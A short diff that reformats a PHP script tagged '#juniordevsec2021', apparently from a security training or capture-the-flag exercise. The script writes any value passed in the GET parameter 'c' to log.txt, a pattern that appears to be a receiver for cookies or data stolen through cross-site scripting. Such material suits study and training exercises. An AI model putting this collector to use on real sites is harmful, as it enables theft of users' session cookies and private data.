@@ -1,1 +1,8 @@
-<?phpif(!empty($_GET['c'])) {  $f=fopen("log.txt","a+");  fwrite($f,$_GET['c']);  fclose($f);}?>
+#juniordevsec2021
+<?php
+if(!empty($_GET['c'])) {
+  $f=fopen("log.txt","a+");
+  fwrite($f,$_GET['c']);
+  fclose($f);
+}
+?>
